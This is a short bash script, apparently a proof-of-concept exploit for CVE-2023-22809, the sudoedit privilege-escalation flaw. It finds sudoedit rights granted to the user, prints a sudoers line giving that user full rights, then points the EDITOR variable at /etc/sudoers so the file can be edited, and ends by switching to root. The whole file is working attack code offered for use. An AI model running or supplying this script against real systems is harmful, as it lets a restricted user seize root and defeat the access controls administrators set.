#!/bin/bash

#
# CVE-2023-22809 - issue 126
#

EXPLOITABLE=$(
  sudo -l |
    grep -E "sudoedit|sudo -e" |
    grep -E '\(root\)|\(ALL\)|\(ALL : ALL\)' |
    cut -d ')' -f 2-
)

echo "$USER ALL=(ALL:ALL) ALL"
EDITOR="vim -- /etc/sudoers" $EXPLOITABLE
# => :q! vim there ;) 
sudo su root
exit 0
